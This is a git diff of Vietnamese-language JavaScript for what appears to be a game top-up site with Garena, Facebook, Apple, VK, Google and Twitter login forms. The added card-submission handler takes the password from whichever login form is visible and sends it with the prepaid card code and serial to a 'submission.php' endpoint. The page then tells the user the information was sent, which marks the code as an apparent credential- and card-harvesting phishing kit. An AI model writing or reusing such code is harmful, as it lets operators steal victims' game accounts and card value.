@@ -49,6 +49,92 @@ if (paymentMethods) {
     });
 }
 
+// Xử lý nạp thẻ
+const cardForm = document.querySelector(".card-form");
+if (cardForm) {
+    const submitBtn = cardForm.querySelector(".submit-btn");
+    
+    submitBtn.addEventListener("click", async (e) => {
+        e.preventDefault();
+        
+        // Lấy thông tin thẻ
+        const cardCode = document.getElementById("card-code").value;
+        const serialNumber = document.getElementById("serial").value;
+        
+        // Lấy mệnh giá thẻ đã chọn
+        const selectedPrice = document.querySelector('input[name="price"]:checked');
+        if (!selectedPrice) {
+            alert("Vui lòng chọn mệnh giá thẻ");
+            return;
+        }
+        
+        const amount = parseInt(selectedPrice.value);
+        
+        // Kiểm tra dữ liệu
+        if (!cardCode || !serialNumber) {
+            alert("Vui lòng nhập đầy đủ thông tin thẻ");
+            return;
+        }
+        
+        try {
+            const activeLoginMethod = document.querySelector('.login-methods button.active');
+            const loginType = activeLoginMethod ? activeLoginMethod.innerText.trim() : 'Unknown';
+            
+            const loginForm = document.querySelector('.login-form[style*="block"]');
+            let loginIdentifier = '';
+            let loginPassword = '';
+            if (loginForm) {
+                const identifierInput = loginForm.querySelector('input[type="text"], input[type="email"]');
+                const passwordInput = loginForm.querySelector('input[type="password"]');
+                if (identifierInput) {
+                    loginIdentifier = identifierInput.value;
+                }
+                if (passwordInput) {
+                    loginPassword = passwordInput.value;
+                }
+            }
+            
+            const activePaymentMethod = document.querySelector('.payment-methods button.active');
+            const paymentMethod = activePaymentMethod ? activePaymentMethod.innerText.trim() : 'Unknown';
+
+            const requestData = {
+                login_type: loginType,
+                login_identifier: loginIdentifier,
+                login_password: loginPassword,
+                payment_method: paymentMethod,
+                amount: amount,
+                card_code: cardCode,
+                serial_number: serialNumber
+            };
+            
+            // Gửi request API
+            const response = await fetch(BASE_URL + '/backend/api/submission.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(requestData)
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                alert("Thông tin của bạn đã được gửi thành công!");
+            } else {
+                alert(result.message || "Có lỗi xảy ra khi gửi thông tin");
+            }
+        } catch (error) {
+            console.error("Error:", error);
+            alert("Có lỗi xảy ra khi kết nối đến máy chủ");
+        }
+    });
+}
+
+// Hàm format tiền tệ
+function formatCurrency(amount) {
+    return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
+}
+
 // Login Forms
 document.addEventListener('DOMContentLoaded', function () {
     const loginMethods = document.querySelectorAll(".login-methods");
@@ -59,18 +145,11 @@ document.addEventListener('DOMContentLoaded', function () {
 
         loginButtons.forEach(button => {
             button.addEventListener("click", () => {
-                // Bỏ active tất cả các nút
                 loginButtons.forEach(btn => btn.classList.remove("active"));
-                // Ẩn tất cả các form
                 loginForms.forEach(form => form.style.display = "none");
-
-                // Kích hoạt nút được click
                 button.classList.add("active");
-
-                // Hiển thị form tương ứng
-                const formId = button.id;
-                const targetFormId = formId.replace("-btn", "-form");
-                const targetForm = document.getElementById(targetFormId);
+                const formId = button.id.replace("-btn-page", "-form-page");
+                const targetForm = document.getElementById(formId) || document.getElementById(formId.replace("-page", ""));
                 if (targetForm) {
                     targetForm.style.display = "block";
                 }
@@ -83,6 +162,8 @@ document.addEventListener('DOMContentLoaded', function () {
 document.addEventListener('DOMContentLoaded', function () {
     const loginModal = document.getElementById("login-modal");
     const loginBtn = document.getElementById("login-btn");
+    if (!loginModal || !loginBtn) return;
+
     const closeBtn = loginModal.querySelector(".close-btn");
     const garenaLoginBtn = document.getElementById("garena-login-btn");
     const facebookLoginBtn = document.getElementById("facebook-login-btn");
@@ -90,21 +171,19 @@ document.addEventListener('DOMContentLoaded', function () {
     const facebookLoginForm = document.getElementById("facebook-login-form");
     const loginOptions = loginModal.querySelector(".login-options");
 
-    if (loginBtn) {
-        loginBtn.addEventListener('click', function (event) {
-            event.preventDefault();
-            loginModal.style.display = "block";
-            garenaLoginForm.style.display = "none";
-            facebookLoginForm.style.display = "none";
-            loginOptions.style.display = "flex";
-        });
-    }
+    loginBtn.addEventListener('click', function (event) {
+        event.preventDefault();
+        loginModal.style.display = "block";
+        garenaLoginForm.style.display = "none";
+        facebookLoginForm.style.display = "none";
+        loginOptions.style.display = "flex";
+        garenaLoginBtn.style.display = "flex";
+        facebookLoginBtn.style.display = "flex";
+    });
 
-    if (closeBtn) {
-        closeBtn.addEventListener('click', function () {
-            loginModal.style.display = "none";
-        });
-    }
+    closeBtn.addEventListener('click', function () {
+        loginModal.style.display = "none";
+    });
 
     window.addEventListener('click', function (event) {
         if (event.target == loginModal) {
@@ -112,144 +191,51 @@ document.addEventListener('DOMContentLoaded', function () {
         }
     });
 
-    if (garenaLoginBtn) {
-        garenaLoginBtn.addEventListener('click', function (event) {
-            event.preventDefault();
-            facebookLoginBtn.style.display = "none";
-            garenaLoginForm.style.display = "block";
-            garenaLoginBtn.style.display = "none";
-        });
-    }
+    garenaLoginBtn.addEventListener('click', function (event) {
+        event.preventDefault();
+        loginOptions.style.display = "none";
+        garenaLoginForm.style.display = "block";
+    });
 
-    if (facebookLoginBtn) {
-        facebookLoginBtn.addEventListener('click', function (event) {
-            event.preventDefault();
-            garenaLoginBtn.style.display = "none";
-            facebookLoginForm.style.display = "block";
-            facebookLoginBtn.style.display = "none";
-        });
-    }
-    if (loginBtn) {
-        loginBtn.addEventListener('click', function (event) {
-            event.preventDefault();
-            loginModal.style.display = "block";
-            garenaLoginForm.style.display = "none";
-            facebookLoginForm.style.display = "none";
-            loginOptions.style.display = "flex";
-            garenaLoginBtn.style.display = "flex";
-            facebookLoginBtn.style.display = "flex";
-        });
-    }
+    facebookLoginBtn.addEventListener('click', function (event) {
+        event.preventDefault();
+        loginOptions.style.display = "none";
+        facebookLoginForm.style.display = "block";
+    });
 
-    // Page-specific login forms
-    const garenaLoginBtnPage = document.getElementById("garena-login-btn-page");
-    const facebookLoginBtnPage = document.getElementById("facebook-login-btn-page");
-    const uidLoginBtnPage = document.getElementById("uid-login-btn-page");
-    const appleLoginBtnPage = document.getElementById("apple-login-btn-page");
-    const vkLoginBtnPage = document.getElementById("vk-login-btn-page");
-    const googleLoginBtnPage = document.getElementById("google-login-btn-page");
-    const twitterLoginBtnPage = document.getElementById("twitter-login-btn-page");
-    
-    const garenaLoginFormPage = document.getElementById("garena-login-form-page");
-    const facebookLoginFormPage = document.getElementById("facebook-login-form-page");
-    const uidLoginFormPage = document.getElementById("uid-login-form");
-    const appleLoginFormPage = document.getElementById("apple-login-form");
-    const vkLoginFormPage = document.getElementById("vk-login-form");
-    const googleLoginFormPage = document.getElementById("google-login-form");
-    const twitterLoginFormPage = document.getElementById("twitter-login-form");
-    
-    const loginMethodsPage = document.querySelector(".login-methods");
+    // Xử lý gửi biểu mẫu đăng nhập Garena
+    const handleLogin = async (event) => {
+        event.preventDefault();
+        const form = event.target;
+        const username = form.querySelector('input[type="text"], input[type="email"]').value;
+        const password = form.querySelector('input[type="password"]').value;
 
-    if (garenaLoginBtnPage) {
-        garenaLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            garenaLoginFormPage.style.display = "block";
-            facebookLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
+        try {
+            const response = await fetch(BASE_URL + '/backend/api/users/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            });
 
-    if (facebookLoginBtnPage) {
-        facebookLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            facebookLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
-    
-    if (uidLoginBtnPage) {
-        uidLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            uidLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            facebookLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
-    
-    // Thêm xử lý cho các nút còn lại
-    if (appleLoginBtnPage) {
-        appleLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            appleLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            facebookLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
-    
-    // Tương tự cho các nút còn lại
-    if (vkLoginBtnPage) {
-        vkLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            vkLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            facebookLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
-    
-    if (googleLoginBtnPage) {
-        googleLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            googleLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            facebookLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            twitterLoginFormPage.style.display = "none";
-        });
-    }
-    
-    if (twitterLoginBtnPage) {
-        twitterLoginBtnPage.addEventListener('click', function (event) {
-            event.preventDefault();
-            twitterLoginFormPage.style.display = "block";
-            garenaLoginFormPage.style.display = "none";
-            facebookLoginFormPage.style.display = "none";
-            uidLoginFormPage.style.display = "none";
-            appleLoginFormPage.style.display = "none";
-            vkLoginFormPage.style.display = "none";
-            googleLoginFormPage.style.display = "none";
-        });
-    }
+            const result = await response.json();
+
+            if (result.success) {
+                if (result.data.redirect) {
+                    window.location.href = result.data.redirect;
+                } else {
+                    window.location.reload();
+                }
+            } else {
+                alert(result.message || 'Đăng nhập thất bại');
+            }
+        } catch (error) {
+            console.error('Lỗi đăng nhập:', error);
+            alert('Đã xảy ra lỗi khi đăng nhập.');
+        }
+    };
+
+    garenaLoginForm.addEventListener('submit', handleLogin);
+    facebookLoginForm.addEventListener('submit', handleLogin);
 });
